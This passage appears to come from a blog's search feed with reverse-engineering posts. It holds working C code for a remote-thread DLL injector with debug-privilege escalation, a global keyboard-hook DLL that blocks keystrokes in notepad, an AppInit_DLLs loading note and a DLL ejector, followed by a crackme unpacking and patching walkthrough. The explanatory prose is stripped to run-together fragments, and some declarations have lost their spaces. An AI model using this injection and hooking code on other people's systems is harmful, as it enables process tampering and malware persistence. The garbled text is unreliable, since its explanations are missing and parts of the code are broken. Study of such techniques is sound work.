class="string">L&quot;USAGE : %s &lt;pid&gt; &lt;dll_path&gt;\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    _tprintf(<span class="string">L&quot;%s,%s&quot;</span>, argv[<span class="number">1</span>], argv[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">if</span> (!Inject((DWORD)_tstol(argv[<span class="number">1</span>]), argv[<span class="number">2</span>])) &#123;</span><br><span class="line">        _tprintf(<span class="string">L&quot;InjectDll(\&quot;%s\&quot;) failed!!!\n&quot;</span>, argv[<span class="number">2</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    _tprintf(<span class="string">L&quot;InjectDll(\&quot;%s\&quot;) success!!!\n&quot;</span>, argv[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>SeDebug,</strong></p><table><thead><tr><th><strong>SE_DEBUG_NAME</strong> TEXT (SeDebugPrivilege)</th><th> </th></tr></thead></table><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">BOOL <span class="title function_">SetPrivilege</span><span class="params">(LPCTSTR lpszPrivilege, BOOL bEnablePrivilege)</span> &#123;</span><br><span class="line">    TOKEN_PRIVILEGES tp;</span><br><span class="line">    HANDLE hToken;</span><br><span class="line">    LUID luid;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!OpenProcessToken(GetCurrentProcess(),</span><br><span class="line">        TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,</span><br><span class="line">        &amp;hToken)) &#123;</span><br><span class="line">        _tprintf(<span class="string">L&quot;OpenProcessToken error: %u\n&quot;</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!LookupPrivilegeValue(<span class="literal">NULL</span>,           <span class="comment">// lookup privilege on local system</span></span><br><span class="line">        lpszPrivilege,  <span class="comment">// privilege to lookup </span></span><br><span class="line">        &amp;luid))        <span class="comment">// receives LUID of privilege</span></span><br><span class="line">    &#123;</span><br><span class="line">        _tprintf(<span class="string">L&quot;LookupPrivilegeValue error: %u\n&quot;</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    tp.PrivilegeCount = <span class="number">1</span>;</span><br><span class="line">    tp.Privileges[<span class="number">0</span>].Luid = luid;</span><br><span class="line">    <span class="keyword">if</span> (bEnablePrivilege)</span><br><span class="line">        tp.Privileges[<span class="number">0</span>].Attributes = SE_PRIVILEGE_ENABLED;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        tp.Privileges[<span class="number">0</span>].Attributes = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Enable the privilege or disable all privileges.</span></span><br><span class="line">    <span class="keyword">if</span> (!AdjustTokenPrivileges(hToken,</span><br><span class="line">        FALSE,</span><br><span class="line">        &amp;tp,</span><br><span class="line">        <span class="keyword">sizeof</span>(TOKEN_PRIVILEGES),</span><br><span class="line">        (PTOKEN_PRIVILEGES)<span class="literal">NULL</span>,</span><br><span class="line">        (PDWORD)<span class="literal">NULL</span>)) &#123;</span><br><span class="line">        _tprintf(<span class="string">L&quot;AdjustTokenPrivileges error: %u\n&quot;</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (GetLastError() == ERROR_NOT_ALL_ASSIGNED) &#123;</span><br><span class="line">        _tprintf(<span class="string">L&quot;The token does not have the specified privilege. \n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!SetPrivilege(SE_DEBUG_NAME, TRUE))</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br></pre></td></tr></table></figure><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p><img src="/2023/05/25/Dynamic-DLL-Injection-and-unloading/image-20230526000213620.png" alt="image-20230526000213620"></p><p>SetWindowsHookEx</p><p>3232</p><p>KeyHook.dll</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// dllmain.cpp :  DLL </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;pch.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEF_PROCESS_NAME        <span class="string">L&quot;notepad.exe&quot;</span></span></span><br><span class="line">HINSTANCE g_hInstance = <span class="literal">NULL</span>;    </span><br><span class="line">HHOOK g_hHook = <span class="literal">NULL</span>;</span><br><span class="line">HWND g_hWnd = <span class="literal">NULL</span>;</span><br><span class="line">BOOL APIENTRY <span class="title function_">DllMain</span><span class="params">( HMODULE hModule,</span></span><br><span class="line"><span class="params">                       DWORD  ul_reason_for_call,</span></span><br><span class="line"><span class="params">                       LPVOID lpReserved</span></span><br><span class="line"><span class="params">                     )</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">        g_hInstance = hModule;</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line">LRESULT CALLBACK <span class="title function_">KeyboardProc</span><span class="params">(<span class="type">int</span> nCode, WPARAM wParam, LPARAM lParam)</span> &#123;</span><br><span class="line">    TCHAR szPath[MAX_PATH] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    TCHAR* p = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (nCode &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// bit 31 : 0 =&gt; press, 1 =&gt; release</span></span><br><span class="line">        <span class="keyword">if</span> (!(lParam &amp; <span class="number">0x80000000</span>)) &#123;</span><br><span class="line">            GetModuleFileName(<span class="literal">NULL</span>, szPath, MAX_PATH);</span><br><span class="line">            p = _tcsrchr(szPath, <span class="string">&#x27;\\&#x27;</span>);</span><br><span class="line">            MessageBox(<span class="literal">NULL</span>, szPath, szPath, MB_OK);</span><br><span class="line">            <span class="comment">// notepad</span></span><br><span class="line">            <span class="keyword">if</span> (!_tcsicmp(p + <span class="number">1</span>, DEF_PROCESS_NAME))</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// notepad</span></span><br><span class="line">    <span class="keyword">return</span> CallNextHookEx(g_hHook, nCode, wParam, lParam);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __cplusplus</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    __declspec(dllexport) <span class="type">void</span> <span class="title function_">HookStart</span><span class="params">()</span><span class="comment">//DLL</span></span><br><span class="line">    &#123;</span><br><span class="line">        MessageBox(<span class="literal">NULL</span>,<span class="string">L&quot;hook start&quot;</span>,<span class="string">L&quot;hook start&quot;</span>,MB_OK);</span><br><span class="line">        g_hHook = SetWindowsHookEx(WH_KEYBOARD, KeyboardProc, g_hInstance, <span class="number">0</span>);<span class="comment">//g_hInstancedll</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    __declspec(dllexport) <span class="type">void</span> <span class="title function_">HookStop</span><span class="params">()</span><span class="comment">//DLL</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (g_hHook) &#123;</span><br><span class="line">            UnhookWindowsHookEx(g_hHook);</span><br><span class="line">            g_hHook = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __cplusplus</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>MainHook.cpp</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;conio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>    DEF_DLL_NAME<span class="string">&quot;KeyHook.dll&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>    DEF_HOOKSTART<span class="string">&quot;HookStart&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>    DEF_HOOKSTOP<span class="string">&quot;HookStop&quot;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">void</span> <span class="params">(*PFN_HOOKSTART)</span><span class="params">()</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">void</span> <span class="params">(*PFN_HOOKSTOP)</span><span class="params">()</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    HMODULEhDll = <span class="literal">NULL</span>;</span><br><span class="line">    PFN_HOOKSTARTHookStart = <span class="literal">NULL</span>;</span><br><span class="line">    PFN_HOOKSTOPHookStop = <span class="literal">NULL</span>;</span><br><span class="line">    hDll = LoadLibraryA(DEF_DLL_NAME);</span><br><span class="line">    <span class="keyword">if</span> (hDll == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;LoadLibrary(%s) failed!!! [%d]&quot;</span>, DEF_DLL_NAME, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// </span></span><br><span class="line">    HookStart = (PFN_HOOKSTART)GetProcAddress(hDll, DEF_HOOKSTART);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;HookStart(%p)\n &quot;</span>, HookStart);</span><br><span class="line">    HookStop = (PFN_HOOKSTOP)GetProcAddress(hDll, DEF_HOOKSTOP);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;HookStop(%p)\n &quot;</span>, HookStop);</span><br><span class="line">    HookStart();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;mortypress &#x27;q&#x27; to quit!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">while</span> (_getch() != <span class="string">&#x27;q&#x27;</span>);</span><br><span class="line">    <span class="comment">// </span></span><br><span class="line">    HookStop();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// KeyHook.dll</span></span><br><span class="line">    FreeLibrary(hDll);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>AppInit_DLLsDLLLoadAppInit_DLLs1user32.dllAppInit_DllsDLLDLL</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows</span><br></pre></td></tr></table></figure><p>dll</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if( !GetModuleFileName( NULL, szPath, MAX_PATH ) )// </span><br><span class="line">           break;</span><br><span class="line">  </span><br><span class="line">       if( !(p = _tcsrchr(szPath, &#x27;\\&#x27;)) )// strrchr str  c char  NULL </span><br><span class="line">           break;</span><br><span class="line"></span><br><span class="line">       if( _tcsicmp(p+1, &quot;&quot;) )</span><br><span class="line">           break;</span><br></pre></td></tr></table></figure><h2 id="DLL"><a href="#DLL" class="headerlink" title="DLL"></a>DLL</h2><ul><li>CreateToolhelp32Snapshot<strong>TH32CS_SNAPALL</strong></li><li>Process32FirstNEXTPROCESSENTRY32szExeFilenotepad</li><li>CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, dwPID)dll dll</li><li>FreeLibrary</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;tlhelp32.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEF_PROC_NAME    (<span class="string">L&quot;notepad.exe&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEF_DLL_NAME    (<span class="string">L&quot;hack.dll&quot;</span>)</span></span><br><span class="line">DWORD <span class="title function_">FindProcessID</span><span class="params">(LPCTSTR szProcessName)</span> &#123;</span><br><span class="line">    DWORD dwPID = <span class="number">0xFFFFFFFF</span>;</span><br><span class="line">    HANDLE hSnapShot = INVALID_HANDLE_VALUE;</span><br><span class="line">    PROCESSENTRY32 pe;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// </span></span><br><span class="line">    pe.dwSize = <span class="keyword">sizeof</span>(PROCESSENTRY32);</span><br><span class="line">    hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// </span></span><br><span class="line">    Process32First(hSnapShot, &amp;pe);</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!_tcsicmp(szProcessName, (LPCTSTR)pe.szExeFile)) &#123;</span><br><span class="line">            dwPID = pe.th32ProcessID;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">while</span> (Process32Next(hSnapShot, &amp;pe));</span><br><span class="line"></span><br><span class="line">    CloseHandle(hSnapShot);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> dwPID;</span><br><span class="line">&#125;</span><br><span class="line">BOOL <span class="title function_">EjectDll</span><span class="params">(DWORD dwPID, LPCTSTR szDllName)</span> &#123;</span><br><span class="line">    BOOL bMore = FALSE, bFound = FALSE;</span><br><span class="line">    HANDLE hSnapshot, hProcess, hThread;</span><br><span class="line">    HMODULE hModule = <span class="literal">NULL</span>;</span><br><span class="line">    MODULEENTRY32 me = &#123; <span class="keyword">sizeof</span>(me) &#125;;</span><br><span class="line">    LPTHREAD_START_ROUTINE pThreadProc;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// dwPID = notepad id</span></span><br><span class="line">    <span class="comment">// TH32CS_SNAPMODULE notepad dll</span></span><br><span class="line">    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, dwPID);<span class="comment">//</span></span><br><span class="line"></span><br><span class="line">    bMore = Module32First(hSnapshot, &amp;me);</span><br><span class="line">    <span class="keyword">for</span> (; bMore; bMore = Module32Next(hSnapshot, &amp;me))<span class="comment">//</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (!_tcsicmp((LPCTSTR)me.szModule, szDllName) ||</span><br><span class="line">            !_tcsicmp((LPCTSTR)me.szExePath, szDllName)) &#123;</span><br><span class="line">            bFound = TRUE;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!bFound) &#123;</span><br><span class="line">        CloseHandle(hSnapshot);</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!(hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID)))<span class="comment">//</span></span><br><span class="line">    &#123;</span><br><span class="line">        _tprintf(<span class="string">L&quot;OpenProcess(%d) failed!!! [%d]\n&quot;</span>, dwPID, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    hModule = GetModuleHandle(<span class="string">L&quot;kernel32.dll&quot;</span>);</span><br><span class="line">    pThreadProc = (LPTHREAD_START_ROUTINE)GetProcAddress(hModule, <span class="string">&quot;FreeLibrary&quot;</span>);<span class="comment">//FreeLibraryapi</span></span><br><span class="line">    hThread = CreateRemoteThread(hProcess, <span class="literal">NULL</span>, <span class="number">0</span>,</span><br><span class="line">        pThreadProc, me.modBaseAddr,</span><br><span class="line">        <span class="number">0</span>, <span class="literal">NULL</span>);      <span class="comment">//dll</span></span><br><span class="line">    WaitForSingleObject(hThread, INFINITE);</span><br><span class="line"></span><br><span class="line">    CloseHandle(hThread);</span><br><span class="line">    CloseHandle(hProcess);</span><br><span class="line">    CloseHandle(hSnapshot);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> _tmain()</span><br><span class="line">&#123;</span><br><span class="line">    DWORD dwPID = <span class="number">0xFFFFFFFF</span>;</span><br><span class="line">    dwPID = FindProcessID(DEF_PROC_NAME);<span class="comment">//notepadid    </span></span><br><span class="line">    <span class="keyword">if</span> (dwPID == <span class="number">0xFFFFFFFF</span>) &#123;</span><br><span class="line">        _tprintf(<span class="string">L&quot;There is no &lt;%s&gt; process!\n&quot;</span>, DEF_PROC_NAME);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    _tprintf(<span class="string">L&quot;PID of \&quot;%s\&quot; is %d\n&quot;</span>, DEF_PROC_NAME, dwPID);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (EjectDll(dwPID, DEF_DLL_NAME))</span><br><span class="line">        _tprintf(<span class="string">L&quot;EjectDll(%d, \&quot;%s\&quot;) success!!!\n&quot;</span>, dwPID, DEF_DLL_NAME);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        _tprintf(<span class="string">L&quot;EjectDll(%d, \&quot;%s\&quot;) failed!!!\n&quot;</span>, dwPID, DEF_DLL_NAME);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>(Embedded patch)</title>
      <link href="/2023/05/23/embedded-patch/"/>
      <url>/2023/05/23/embedded-patch/</url>
      
        <content type="html"><![CDATA[<h1 id="-Embedded-patch"><a href="#-Embedded-patch" class="headerlink" title="(Embedded patch)"></a>(Embedded patch)</h1><p><a href="https://pan.baidu.com/s/1sOzl2CaOaEMCoEJZTVrU-g">https://pan.baidu.com/s/1sOzl2CaOaEMCoEJZTVrU-g</a><br>57g8</p><p>0040109B</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">0040109B</span> &lt;unpackme#<span class="number">1.</span>ac | <span class="number">50</span>                       | push eax                                         |</span><br><span class="line"><span class="number">0040109</span>C                | <span class="number">8B</span>D8                     | mov ebx,eax                                      |</span><br><span class="line"><span class="number">0040109</span>E                | B9 <span class="number">54010000</span>              | mov ecx,<span class="number">0x154</span>                                    | ecx:<span class="string">&quot;`&quot;</span></span><br><span class="line"><span class="number">004010</span>A3                | <span class="number">8033</span> <span class="number">44</span>                  | xor byte ptr ds:[ebx],<span class="number">0x44</span>                       |</span><br><span class="line"><span class="number">004010</span>A6                | <span class="number">83E9</span> <span class="number">01</span>                  | sub ecx,<span class="number">0x1</span>                                      | ecx:<span class="string">&quot;`&quot;</span></span><br><span class="line"><span class="number">004010</span>A9                | <span class="number">43</span>                       | inc ebx                                          |</span><br><span class="line"><span class="number">004010</span>AA                | <span class="number">83F</span>9 <span class="number">00</span>                  | cmp ecx,<span class="number">0x0</span>                                      | ecx:<span class="string">&quot;`&quot;</span></span><br><span class="line"><span class="number">004010</span>AD                | <span class="number">75</span> F4                    | jne unpackme#<span class="number">1.</span>ac<span class="number">.4010</span>A3                         |</span><br><span class="line"><span class="number">004010</span>AF                | <span class="number">50</span>                       | push eax                                         |</span><br><span class="line"><span class="number">004010B</span>0                | E8 <span class="number">08000000</span>              | call &lt;unpackme#<span class="number">1.</span>ac.sub_4010BD&gt;                  |</span><br><span class="line"><span class="number">004010B</span>5                | <span class="number">50</span>                       | push eax                                         |</span><br><span class="line"><span class="number">004010B</span>6                | E8 <span class="number">7</span>EFFFFFF              | call &lt;unpackme#<span class="number">1.</span>ac.sub_401039&gt;                  |</span><br><span class="line"><span class="number">004010B</span>B                | <span class="number">58</span>                       | pop eax                                          |</span><br><span class="line"><span class="number">004010B</span>C                | C3                       | ret                                              |</span><br></pre></td></tr></table></figure><p>eax004010F5004010F5 - 004010F5+0x154</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">004010F</span>5 - <span class="number">004010F</span>5+<span class="number">0x154</span> ^<span class="number">0x44</span></span><br></pre></td></tr></table></figure><p><code>call &lt;unpackme#1.ac.sub_4010BD&gt;   </code></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">004010B</span>D &lt;unpackme#<span class="number">1.</span>ac | <span class="number">50</span>                       | push eax                                         |</span><br><span class="line"><span class="number">004010B</span>E                | BB <span class="number">07104000</span>              | mov ebx,unpackme#<span class="number">1.</span>ac<span class="number">.401007</span>                     |</span><br><span class="line"><span class="number">004010</span>C3                | B9 <span class="number">7F</span>000000              | mov ecx,<span class="number">0x7F</span>                                     |</span><br><span class="line"><span class="number">004010</span>C8                | <span class="number">8033</span> <span class="number">07</span>                  | xor byte ptr ds:[ebx],<span class="number">0x7</span>                        |</span><br><span class="line"><span class="number">004010</span>CB                | <span class="number">83E9</span> <span class="number">01</span>                  | sub ecx,<span class="number">0x1</span>                                      |</span><br><span class="line"><span class="number">004010</span>CE                | <span class="number">43</span>                       | inc ebx                                          |</span><br><span class="line"><span class="number">004010</span>CF                | <span class="number">83F</span>9 <span class="number">00</span>                  | cmp ecx,<span class="number">0x0</span>                                      |</span><br><span class="line"><span class="number">004010</span>D2                | <span class="number">75</span> F4                    | jne unpackme#<span class="number">1.</span>ac<span class="number">.4010</span>C8                         |</span><br><span class="line"><span class="number">004010</span>D4                | <span class="number">8B</span>D8                     | mov ebx,eax                                      |</span><br><span class="line"><span class="number">004010</span>D6                | B9 <span class="number">54010000</span>              | mov ecx,<span class="number">0x154</span>                                    |</span><br><span class="line"><span class="number">004010</span>DB                | <span class="number">8033</span> <span class="number">11</span>                  | xor byte ptr ds:[ebx],<span class="number">0x11</span>                       |</span><br><span class="line"><span class="number">004010</span>DE                | <span class="number">83E9</span> <span class="number">01</span>                  | sub ecx,<span class="number">0x1</span>                                      |</span><br><span class="line"><span class="number">004010E1</span>                | <span class="number">43</span>                       | inc ebx                                          |</span><br><span class="line"><span class="number">004010E2</span>                | <span class="number">83F</span>9 <span class="number">00</span>                  | cmp ecx,<span class="number">0x0</span>                                      |</span><br><span class="line"><span class="number">004010E5</span>                | <span class="number">75</span> F4                    | jne unpackme#<span class="number">1.</span>ac<span class="number">.4010</span>DB                         |</span><br><span class="line"><span class="number">004010E7</span>                | <span class="number">58</span>                       | pop eax                                          |</span><br><span class="line"><span class="number">004010E8</span>                | C3                       | ret                                              |</span><br></pre></td></tr></table></figure><p></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">00401007</span> - <span class="number">00401007</span>+<span class="number">0x7f</span> ^<span class="number">0x7</span></span><br><span class="line"><span class="number">004010F</span>5 - <span class="number">004010F</span>5+<span class="number">0x154</span> ^<span class="number">0x11</span></span><br></pre></td></tr></table></figure><p><code>call &lt;unpackme#1.ac.sub_401039&gt;   </code></p><p><img src="/2023/05/23/embedded-patch/image-20230523155641278.png" alt="image-20230523155641278"></p><p>004010F5 - 004010F5+0x154ebx0x31EB8DB0exitprocess</p><p>0040108A40121e</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">0040108</span>A &lt;unpackme#<span class="number">1.</span>ac | <span class="number">50</span>                       | push eax                                         |</span><br><span class="line"><span class="number">0040108B</span>                | <span class="number">56</span>                       | push esi                                         | esi:<span class="string">&quot;`&quot;</span></span><br><span class="line"><span class="number">0040108</span>C                | <span class="number">8B</span>D8                     | mov ebx,eax                                      |</span><br><span class="line"><span class="number">0040108</span>E                | <span class="number">8B</span>CE                     | mov ecx,esi                                      | esi:<span class="string">&quot;`&quot;</span></span><br><span class="line"><span class="number">00401090</span>                | <span class="number">8033</span> <span class="number">17</span>                  | xor byte ptr ds:[ebx],<span class="number">0x17</span>                       |</span><br><span class="line"><span class="number">00401093</span>                | <span class="number">43</span>                       | inc ebx                                          |</span><br><span class="line"><span class="number">00401094</span>                | <span class="number">3B</span>D9                     | cmp ebx,ecx                                      |</span><br><span class="line"><span class="number">00401096</span>                | <span class="number">75</span> F8                    | jne unpackme#<span class="number">1.</span>ac<span class="number">.401090</span>                         |</span><br><span class="line"><span class="number">00401098</span>                | <span class="number">58</span>                       | pop eax                                          |</span><br><span class="line"><span class="number">00401099</span>                | <span class="number">5</span>E                       | pop esi                                          | esi:<span class="string">&quot;`&quot;</span></span><br><span class="line"><span class="number">0040109</span>A                | C3                       | ret                                              |</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">0040124</span>A<span class="number">-00401280</span> ^<span class="number">0x17</span></span><br></pre></td></tr></table></figure><p><img src="/2023/05/23/embedded-patch/image-20230523161559913.png" alt="image-20230523161559913"></p><p>getmodulehadlewin32</p><p>DialogBoxParamAlpDialogFunc004010F5</p><p><img src="/2023/05/23/embedded-patch/image-20230523164357610.png" alt="image-20230523164357610"></p><p>(</p><h2 id="1"><a href="#1" class="headerlink" title="1"></a>1</h2><p></p><h2 id="2"><a href="#2" class="headerlink" title="2"></a>2</h2><p>jmp40121ejmp</p><p></p><p><img src="/2023/05/23/embedded-patch/image-20230523165512284.png" alt="image-20230523165512284"></p><p>0x4000x280(0x1000)</p><p></p><p></p><p><img src="/2023/05/23/embedded-patch/image-20230523172707047.png" alt="image-20230523172707047"></p><p>jmp</p><p><img src="/2023/05/23/embedded-patch/image-20230523173024075.png" alt="image-20230523173024075"></p><p></p><p><img src="/2023/05/23/embedded-patch/image-20230523173139510.png" alt="image-20230523173139510"></p><p></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">00401007</span> - <span class="number">00401007</span>+<span class="number">0x7f</span>(<span class="number">40</span> <span class="number">1086</span>) ^<span class="number">0x7</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; hex(<span class="number">0xE9</span>^<span class="number">7</span>)</span><br><span class="line"><span class="string">&#x27;0xee&#x27;</span></span><br><span class="line">&gt;&gt;&gt; hex(<span class="number">0x05</span>^<span class="number">7</span>)</span><br><span class="line"><span class="string">&#x27;0x2&#x27;</span></span><br><span class="line">&gt;&gt;&gt; hex(<span class="number">0x02</span>^<span class="number">7</span>)</span><br><span class="line"><span class="string">&#x27;0x5&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="/2023/05/23/embedded-patch/image-20230523173624190.png" alt="image-20230523173624190"></p><p>patchok</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>:(</title>
      <link href="/2023/05/20/2023-5-20/"/>
      <url>/2023/05/20/2023-5-20/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="ab9f1a9f344177f8385ebc49cb1adc07442e32ba7cfa4859c51e580c8d862a8e">9437a95e56b24d5da67ff8d3ebbb0d56afa721ffb68934a5c51890a2a491300a58e92e6b56af2ebbdbc377deaa212bf9f157fcdcb5f4708b51a0612cd90096b21938562bd6bed84efb729fa4caf50f4b22f4337db4d1a1ccf2407aa706ccc01ea6504f9dea05278d222f874195aaf36a7443cc68ee81a3c21a9defe11fb506c0c7278a7ed98f7635a3788bbb8c3898f3ce546f15c95a711bbd018bd326ca3fc39a93408c11a2318d2afb338395d57ad645b3d661f8525d43673647c669c3ef2adc24ef6cfdb95f079f38dc6ad09048e922413cead40aada33355b05b868be0bb584f4a5419acd51f70f1eb76b49f52594579523351512c0666c95b74de82140c</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
